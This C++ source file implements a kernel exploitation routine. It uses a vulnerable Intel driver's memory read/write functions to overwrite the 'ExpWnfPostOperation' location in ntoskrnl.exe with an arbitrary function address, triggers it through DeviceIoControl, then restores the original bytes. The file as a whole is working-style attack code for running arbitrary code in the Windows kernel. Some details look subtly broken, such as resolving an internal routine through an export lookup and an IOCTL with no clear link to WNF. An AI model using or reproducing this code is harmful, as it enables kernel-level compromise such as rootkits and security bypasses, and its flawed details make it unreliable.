#include <string>
#include <vector>
#include <Windows.h>
#include "../include/wnf_bridge.hpp"
#include "../include/intel_driver.hpp"
#include "../include/utils.hpp"

namespace wnf_bridge
{
	bool Execute(uint64_t function_address, uint64_t rcx)
	{
		uint64_t ntoskrnl_base = utils::GetKernelModuleBase("ntoskrnl.exe");
		
		uint64_t wnf_dispatch = utils::GetKernelExport(ntoskrnl_base, "ExpWnfPostOperation");
		if (!wnf_dispatch) return false;

		uint64_t original = 0;
		intel_driver::ReadMemory(intel_driver::Open(), wnf_dispatch, &original, sizeof(original));
		intel_driver::WriteMemory(intel_driver::Open(), wnf_dispatch, &function_address, sizeof(function_address));

		WNF_STATE_NAME state = { 0x41414141, 0x42424242 }; 
		DWORD bytes_returned;
		DeviceIoControl(intel_driver::Open(), 0x80862024, &state, sizeof(state), NULL, 0, &bytes_returned, NULL);

		intel_driver::WriteMemory(intel_driver::Open(), wnf_dispatch, &original, sizeof(original));
		return true;
	}
}
